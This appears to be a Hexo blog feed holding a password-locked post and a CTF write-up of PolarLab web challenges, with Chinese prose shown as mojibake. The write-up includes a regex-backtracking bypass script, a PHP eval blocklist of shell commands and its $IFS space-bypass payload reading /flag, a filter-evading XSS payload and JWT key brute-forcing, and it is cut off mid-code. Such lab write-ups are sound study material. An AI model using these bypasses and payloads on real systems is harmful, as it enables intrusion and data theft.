c69e99c62c4402e8767fa07408d219e4095248e0eaab58cd52398f029329695edc53a59ee258e149bc83c878b0fff1d2d94df890670ebc7d339e8b49876c5013063eaf67a70170fe420237651b3f7b34476d1cc895ae6366c7b9deb8347a6f58053c20231cd31c1451fd4025ee203daaff038066a8983ceda3189a5b76ac01d9522f9942f679def9674ba73e0a6e87e7b5985aa71507296892fc34fe7d0577339cabded33188e2a789b9c9b15d24070e38d1485faebf25e2717b5e1cd372337eeebafa9084b1ae9954658f28453d3463a7eba2d753d246c28deaa29db2d49b21587f6de6872bfe02cfbfa9026f8cdf9acff2d459e7af06da6abb139f46ade03f9d24355c4b282fe94577c16732a11a697311d70f9cc98c5878ea1c094c6c51901f8cdd2b641ac91871d99486916ad094111b1e13e4aae6435511efd95a5ea9e132ce7b8b632d02beabeb9540604a367383e352bc60daae2c113b5d74deb08af344af7e840c1ac46b1f1370dac7109d87c16c206ccb661ac27e16782ee44712aa49e5e5076f6e208ed308e382bc3dce27255c0f5c783f7b515578323071108b27c5e4cd59c991ebe837787baff4621bc5842fde079efb9fe4060905113613e64fd4ab86bde15239fe1736c8dd43cd095f096c382ac45bb0c97b02d2960a24e36de7643f0724c72b341c52dfbdfb80867a1ce79924955d5bad1c0c655e10941c22efc128cc2e836da4863d4ea3c471c540f3ceb8efa0b880d9b3c9574518ace6af8eff72038ce86e76b282e8bf9b22289f4533078f2a75dae06a4bb52153201fe2ecd2f8da54a6f64aa3708549e4fc34f9208c4830cab0e233bc3f2bc92d850b34141491c471eaf588b094cc885ae63dbedb095bc3213029e73bf0ce486926c5c30ac37437a4116317a7ef10bf9048a7891b139f619f30c1151f528fee702c49b255c4f7534a7c3bda13244c90bcdf72b4e22e97669cba095ce48cbc7742849227946933f2ee08a22ee796ec2e1e430fe96b09443c4edb2dc9798b0abc7149cc167725b9c6a4b0d3f63bb3b061c23772b4efcdaa27b878787614c0bff8e8d8cfa422b07c9aba4c7128fd6873ab08a2f0c33bc0ac11adc22248cb423f0403dcdd2088862792a0a4f066750f558deb1bbe1916a5298906a9e2aa4557ffb6f25c0d8c804c70c15c41487e4ac733f9a85f0373ed48922d53386e663e25980ebc6b62d90ecfe09735743492413e32b4bda362aa3035db76a47e9c9589e70589fe02432aceb5f14838502a9d310875acb95dba1df129f5f3a7535dc3310d8836e91d486d0858bc6ce31319e62c9d2ce733023c94b245674f8fc3a9caf8da695296b28c42aafe9b6c1df05cdd979be382327dede6164a90d4ab967c8d5d488fb2fe2d58ccc83f766289249798bd067dd1b2a10d267d32e4b5d42090c90f6c4d14204195293cc512e4ac8e3b6928ae0c7237f94bf8f0923772ef200cbdea803705f94754b3405998dbb26a907a82f2606931895cb2f25d1cab68fd07e6f87bcc81091af2390cfd10582a61dfebb5e25e82ae5b8504d895dc5a7bd55c820d5b9f83950482917fcde9965d2045da00562478f2617fe158c0987166a603a15e70add337af35dde8d30f4c89bb7c10dd3a8cc00f03db7cfc8d8c1d0e2b135f12c239b15d8dc74da8ff7648f5de49c809024e282ab9c890234f992a41955182c5a9cad9278add3de07de259cfd86b7163435cc43f4814efed868f931600fc2db60f3a4cd129386dfffca93239c57898563e4b5c10d2b5fea199d64096a29a6276daa90ed618ab9fa37cf6c3bb76b7d59fc4750bd105ebb1a1461e42fbdb9066ac083068eb9f0574ef3db0b091c4e5f06b5fce5c0bb77ce66aea9ec5f0abe3838a8ed6acfb6f3c5b124962638caf063eb6305c900b8bb85613d8058bfaf427a9f7f0e68c74498a4d4193081c8ae29e2fd1971dbaccf23f8c5ace4aaa1f1d595e9580eb369439bdc72a631a4f9066950ba9d6fb8060101bfaf77261d19a983ceb70e5b2e394d06ece55d6911d7dd92b3dee1e9ffb4ccef1b7265a4317b33fe8338cbeaffec03201b1a74237a0297049f03440740056de3036409aa388bbedccf6814e06d0a8f6ad7743dd4db5b8312c58455c34859e5b5256e54425665b68580133268992ddb339332ffcd2d38ed4269c15697382bd3e3bf3f1f01249dc1b84f8c17384a192f2b87d5a5d5d8826fbba5362d524cba2d4408171da9bdf297622a962e9b465bf1db4ae73014fd5a34b83e49bec5bfb60c71148ecb19dc16108e625f402cf9ccde33baf16f7dcba57d522634078984aa3f1ab66047d25ef109fe87eba151d7834b3e66c79eebcf40c447e37174966120c798f5da36249db3ae3beb132ad4fb53481461c4d32e7ef6fb13502c8e2aa8afbe0569dd5b0666678dd0f3bb0d54358cbf5f9e583367e89d6e5e8e6654ffd4f95681534debc21c4584010d9283d4902547a6780d0e0537f631bc88d41c06c32953bb2857810ac1af9680236dbf6c30687deed61dd078b5c10e31ca61e21783fe4c5b8ed5b9ab75f31b4169c9ff73271b6bb85c91bc474cee4bbcb85c32cc39cf04dc97d3db18ae62034ea03829a7f401ca92346665a5417a6fd9b8649ce3fd9e49260eb1795bd1d49f4523588946c1b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Maybe have a guess</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NewStarCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PolarLab-web-Baby</title>
      <link href="/2024/09/21/PolarLab-web-Baby/"/>
      <url>/2024/09/21/PolarLab-web-Baby/</url>
      
        <content type="html"><![CDATA[<h4 id="swp-æ­£åˆ™æœ€å¤§å›æº¯"><a href="#swp-æ­£åˆ™æœ€å¤§å›æº¯" class="headerlink" title="swp(æ­£åˆ™æœ€å¤§å›æº¯)"></a>swp(æ­£åˆ™æœ€å¤§å›æº¯)</h4><p>å…ˆæ‰«æå¾—åˆ°<code>.index.php.swp</code>ï¼Œå¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/sys.*nb/is'</span><span class="token punctuation">,</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$xdmtql</span><span class="token operator">=</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'xdmtql'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">jiuzhe</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$xdmtql</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'sys nb'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag&#123;*******&#125;'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'true .swp file?'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'nijilenijile'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>è€ƒå¯Ÿæ­£åˆ™æœ€å¤§å›æº¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token string">"sys nb"</span><span class="token operator">+</span><span class="token string">"hsad"</span><span class="token operator">*</span><span class="token number">1000000</span>url <span class="token operator">=</span> <span class="token string">"http://1ce7c85b-bed6-4e28-bf60-fcfb671efc81.www.polarctf.com:8090/"</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"xdmtql"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>request<span class="token punctuation">(</span><span class="token string">"POST"</span><span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> allow_redirects<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code<span class="token punctuation">)</span></code></pre><h4 id="ç®€å•rce"><a href="#ç®€å•rce" class="headerlink" title="ç®€å•rce"></a>ç®€å•rce</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">no</span><span class="token punctuation">(</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|more|less|head|tac|tail|nl|od|vim|uniq|system|proc_open|shell_exec|popen| /i"</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token variable">$txt</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"what's up"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yyds</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'yyds'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$yyds</span><span class="token operator">==</span><span class="token string single-quoted-string">'666'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">no</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> nonono</code></pre><p>å‘½ä»¤æ‰§è¡Œå‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token function">system</span><span class="token punctuation">(</span><span class="token punctuation">)</span> è¾“å‡ºå¹¶è¿”å›æœ€åä¸€è¡Œshellç»“æœã€‚<span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span> ä¸è¾“å‡ºç»“æœï¼Œè¿”å›æœ€åä¸€è¡Œshellç»“æœï¼Œæ‰€æœ‰ç»“æœå¯ä»¥ä¿å­˜åˆ°ä¸€ä¸ªè¿”å›çš„æ•°ç»„é‡Œé¢ã€‚<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span> åªè°ƒç”¨å‘½ä»¤ï¼ŒæŠŠå‘½ä»¤çš„è¿è¡Œç»“æœåŸæ ·åœ°ç›´æ¥è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ä¸Šã€‚ï¼ˆæ›¿æ¢systemï¼‰</code></pre><p>è¾“å‡ºå‡½æ•°</p><pre class="language-php" data-language="php"><code class="language-php">catå‡½æ•° ç”±ç¬¬ä¸€è¡Œå¼€å§‹æ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºtacå‡½æ•° ä»æœ€åä¸€è¡Œå€’åºæ˜¾ç¤ºå†…å®¹ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹è¾“å‡ºnl      ç±»ä¼¼äºcat <span class="token operator">-</span>nï¼Œæ˜¾ç¤ºæ—¶è¾“å‡ºè¡Œå·more    æ ¹æ®çª—å£å¤§å°ï¼Œä¸€é¡µä¸€é¡µçš„ç°å®æ–‡ä»¶å†…å®¹less    å’Œmoreç±»ä¼¼ï¼Œä½†å…¶ä¼˜ç‚¹å¯ä»¥å¾€å‰ç¿»é¡µï¼Œè€Œä¸”è¿›è¡Œå¯ä»¥æœç´¢å­—ç¬¦head    åªæ˜¾ç¤ºå¤´å‡ è¡Œtail    åªæ˜¾ç¤ºæœ€åå‡ è¡Œsort    æ–‡æœ¬å†…å®¹æ’åˆ—more<span class="token punctuation">:</span>ä¸€é¡µä¸€é¡µçš„æ˜¾ç¤ºæ¡£æ¡ˆå†…å®¹less<span class="token punctuation">:</span>ä¸ more ç±»ä¼¼head<span class="token punctuation">:</span>æŸ¥çœ‹å¤´å‡ è¡Œtac<span class="token punctuation">:</span>ä»æœ€åä¸€è¡Œå¼€å§‹æ˜¾ç¤ºï¼Œå¯ä»¥çœ‹å‡º tac æ˜¯ cat çš„åå‘æ˜¾ç¤ºtail<span class="token punctuation">:</span>æŸ¥çœ‹å°¾å‡ è¡Œnlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·od<span class="token punctuation">:</span>ä»¥äºŒè¿›åˆ¶çš„æ–¹å¼è¯»å–æ¡£æ¡ˆå†…å®¹vi<span class="token punctuation">:</span>ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹vim<span class="token punctuation">:</span>ä¸€ç§ç¼–è¾‘å™¨ï¼Œè¿™ä¸ªä¹Ÿå¯ä»¥æŸ¥çœ‹sort<span class="token punctuation">:</span>å¯ä»¥æŸ¥çœ‹uniq<span class="token punctuation">:</span>å¯ä»¥æŸ¥çœ‹file <span class="token operator">-</span>f<span class="token punctuation">:</span>æŠ¥é”™å‡ºå…·ä½“å†…å®¹sh <span class="token operator">/</span>flag <span class="token number">2</span><span class="token operator">></span><span class="token operator">%</span><span class="token number">261</span> <span class="token comment">//æŠ¥é”™å‡ºæ–‡ä»¶å†…å®¹</span></code></pre><p>ç©ºæ ¼ç»•è¿‡</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#123;</span><span class="token constant">IFS</span><span class="token punctuation">&#125;</span><span class="token variable">$9</span><span class="token variable">$IFS</span><span class="token variable">$9</span>é‡å®šå‘ç¬¦ï¼š<span class="token operator">&lt;</span><span class="token operator">></span>ï¼ˆä½†æ˜¯ä¸æ”¯æŒåé¢è·Ÿé€šé…ç¬¦ï¼‰æ°´å¹³åˆ¶è¡¨ç¬¦<span class="token operator">%</span><span class="token number">09</span><span class="token operator">%</span><span class="token number">0</span>a å›è½¦<span class="token operator">%</span><span class="token number">0</span>dæ¢è¡Œ</code></pre><p>Payload:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">/</span><span class="token operator">?</span>sys<span class="token operator">=</span><span class="token function">passthru</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sort$IFS/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token constant">POST</span><span class="token punctuation">:</span> yyds<span class="token operator">=</span><span class="token number">666</span></code></pre><h4 id="èœœé›ªå†°åŸå‰è­¦åº—-js"><a href="#èœœé›ªå†°åŸå‰è­¦åº—-js" class="headerlink" title="èœœé›ªå†°åŸå‰è­¦åº—(js)"></a>èœœé›ªå†°åŸå‰è­¦åº—(js)</h4><p><img src="js.png" loading="lazy"></p><p>ä¿®æ”¹å‰ç«¯ä»»æ„æŒ‰é’®idä¸º9å³å¯</p><h4 id="å¬å”¤ç¥é¾™"><a href="#å¬å”¤ç¥é¾™" class="headerlink" title="å¬å”¤ç¥é¾™"></a>å¬å”¤ç¥é¾™</h4><p><img src="js2.png" loading="lazy"></p><h4 id="seek-flag"><a href="#seek-flag" class="headerlink" title="seek flag"></a>seek flag</h4><p>Cookie:idæ”¹ä¸º1 flag1:flag{7ac5b</p><p>æŠ“åŒ…å“åº”  Flag2: 3ca8737a70f029d</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>ç„¯ï¼Œçˆ¬è™«è¦æ˜¯çˆ¬åˆ°æˆ‘çš„flagæ€ä¹ˆåŠ<span class="token operator">--</span><span class="token operator">></span></code></pre><p>æŸ¥çœ‹robots.txt</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">#flag3:c0ad71dadd11&#125;</span></code></pre><h4 id="jwt"><a href="#jwt" class="headerlink" title="jwt"></a>jwt</h4><p>å“åº”å¤´ï¼šFlag-is-admins-password</p><p>éšä¾¿æ³¨å†Œè´¦å·ç™»å½•æœ‰ä¸ªäººä¸­å¿ƒå¯ä»¥çœ‹åˆ°å¯†ç ï¼ŒæŠ“åŒ…å¾—åˆ°jwt ä¸è¿‡è¦çˆ†ç ´keyï¼ˆçœ‹wpæ˜¯4ä½å¤§å†™å­—æ¯<del>ä¸çŸ¥é“æ€ä¹ˆçˆ†çš„ æ¼</del></p><pre class="language-bash" data-language="bash"><code class="language-bash">crunch <span class="token number">1</span> <span class="token number">4</span> <span class="token parameter variable">-f</span> /usr/share/crunch/charset.lst ualpha <span class="token parameter variable">-o</span> ./4ualpha.txt</code></pre><p>ç”Ÿæˆå­—å…¸çˆ†ç ´ keyä¸ºSYSA å°†ç”¨æˆ·åæ”¹ä¸ºadminå³å¯å¾—åˆ°å¯†ç </p><h4 id="login"><a href="#login" class="headerlink" title="login"></a>login</h4><p>æºç ç»™äº†æç¤º<code>&lt;!--20200101 20200101--&gt;</code></p><p>ç™»å½•ä¸Šå» åªæ˜¾ç¤ºäº†ç™»é™†æˆåŠŸ æ²¡æ€è·¯</p><p>çœ‹äº†wpè¯´æ˜¯ä½¿ç”¨20200102è¿”å›äº†f ç„¶åä¾æ¬¡å¾€ä¸‹çˆ†ç ´ğŸ˜…</p><pre class="language-php" data-language="php"><code class="language-php">flag<span class="token punctuation">&#123;</span>dlcg<span class="token punctuation">&#125;</span></code></pre><h4 id="iphone-UAæ ‡è¯†"><a href="#iphone-UAæ ‡è¯†" class="headerlink" title="iphone(UAæ ‡è¯†)"></a>iphone(UAæ ‡è¯†)</h4><p><img src="iPhone.png" loading="lazy"></p><p>å°è¯•æ‰¾ä¸ªiPhoneçš„UAå¤´</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># Safari ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>iPhone<span class="token punctuation">;</span> <span class="token constant">CPU</span> iPhone <span class="token constant">OS</span> <span class="token number">13_5_1</span> like Mac <span class="token constant">OS</span> <span class="token constant">X</span><span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">605.1</span><span class="token number">.15</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Version<span class="token operator">/</span><span class="token number">13.1</span><span class="token number">.1</span> Mobile<span class="token operator">/</span><span class="token number">15E148</span> Safari<span class="token operator">/</span><span class="token number">604.1</span><span class="token comment"># çˆ¬è™«å’Œæœºå™¨äººç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> Googlebot<span class="token operator">/</span><span class="token number">2.1</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//www.google.com/bot.html)</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>compatible<span class="token punctuation">;</span> YandexAccessibilityBot<span class="token operator">/</span><span class="token number">3.0</span><span class="token punctuation">;</span> <span class="token operator">+</span>http<span class="token punctuation">:</span><span class="token comment">//yandex.com/bots)</span><span class="token comment"># åº“ä¸ç½‘ç»œå·¥å…·çš„ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>PostmanRuntime<span class="token operator">/</span><span class="token number">7.26</span><span class="token number">.5</span>curl<span class="token operator">/</span><span class="token number">7.64</span><span class="token number">.1</span><span class="token comment"># å¾®è½¯ Edge ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>Windows <span class="token constant">NT</span> <span class="token number">10.0</span><span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.4472</span><span class="token number">.124</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> Edg<span class="token operator">/</span><span class="token number">91.0</span><span class="token number">.864</span><span class="token number">.59</span><span class="token comment"># Opera ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.106</span> Safari<span class="token operator">/</span><span class="token number">537.36</span> <span class="token constant">OPR</span><span class="token operator">/</span><span class="token number">38.0</span><span class="token number">.2220</span><span class="token number">.41</span><span class="token comment"># Chrome ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token constant">X11</span><span class="token punctuation">;</span> Linux x86_64<span class="token punctuation">)</span> AppleWebKit<span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span><span class="token constant">KHTML</span><span class="token punctuation">,</span> like Gecko<span class="token punctuation">)</span> Chrome<span class="token operator">/</span><span class="token number">51.0</span><span class="token number">.2704</span><span class="token number">.103</span> Safari<span class="token operator">/</span><span class="token number">537.36</span><span class="token comment"># Firefox ç”¨æˆ·ä»£ç†å­—ç¬¦ä¸²</span>Mozilla<span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span>platform<span class="token punctuation">;</span> rv<span class="token punctuation">:</span>geckoversion<span class="token punctuation">)</span> Gecko<span class="token operator">/</span>geckotrail Firefox<span class="token operator">/</span>firefoxversion</code></pre><h4 id="æµ®ç”Ÿæ—¥è®°-xss"><a href="#æµ®ç”Ÿæ—¥è®°-xss" class="headerlink" title="æµ®ç”Ÿæ—¥è®°(xss)"></a>æµ®ç”Ÿæ—¥è®°(xss)</h4><p><img src="xss.png" loading="lazy"></p><p>æœ‰ç‚¹åƒxssä½†æ˜¯è¿‡æ»¤äº†åŸºæœ¬çš„</p><p><img src="xss_2.png" loading="lazy"></p><p>å…ˆé—­åˆ<code>&quot;</code>ç„¶ååœ¨åŒå†™è¯•è¯•</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>scrscriptipt<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">></span></code></pre><h4 id="GLOBALS"><a href="#GLOBALS" class="headerlink" title="$$(GLOBALS)"></a>$$(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*PolarD&amp;N CTF*/</span><span class="token function">highlight_file</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag|\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"oh on!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"var_dump(<span class="token interpolation"><span class="token variable">$$a</span></span>);"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$GLOBALS</span>ï¼šå¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ï¼ˆä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ï¼‰ï¼Œä¸æ‰€æœ‰å…¶ä»–è¶…å…¨å±€å˜é‡ä¸åŒï¼Œ<span class="token variable">$GLOBALS</span>åœ¨<span class="token constant">PHP</span>ä»£ç ä¸­ä»»ä½•åœ°æ–¹æ€»æ˜¯å¯ç”¨çš„<span class="token keyword">global</span>åœ¨<span class="token constant">PHP</span>ä¸­çš„è§£ææ˜¯ï¼š<span class="token keyword">global</span>çš„ä½œç”¨æ˜¯å®šä¹‰å…¨å±€å˜é‡<span class="token punctuation">,</span>ä½†æ˜¯è¿™ä¸ªå…¨å±€å˜é‡ä¸æ˜¯åº”ç”¨äºæ•´ä¸ªç½‘ç«™<span class="token punctuation">,</span>è€Œæ˜¯åº”ç”¨äºå½“å‰é¡µé¢<span class="token punctuation">,</span>åŒ…æ‹¬<span class="token keyword">include</span>æˆ–<span class="token keyword">require</span>çš„æ‰€æœ‰æ–‡ä»¶ã€‚æ³¨ï¼šåœ¨å‡½æ•°ä½“å†…å®šä¹‰çš„<span class="token keyword">global</span>å˜é‡<span class="token punctuation">,</span>å‡½æ•°ä½“å¤–å¯ä»¥ä½¿ç”¨<span class="token punctuation">,</span>åœ¨å‡½æ•°ä½“å¤–å®šä¹‰çš„<span class="token keyword">global</span>å˜é‡ä¸èƒ½åœ¨å‡½æ•°ä½“å†…ä½¿ç”¨</code></pre><h4 id="çˆ†ç ´"><a href="#çˆ†ç ´" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token 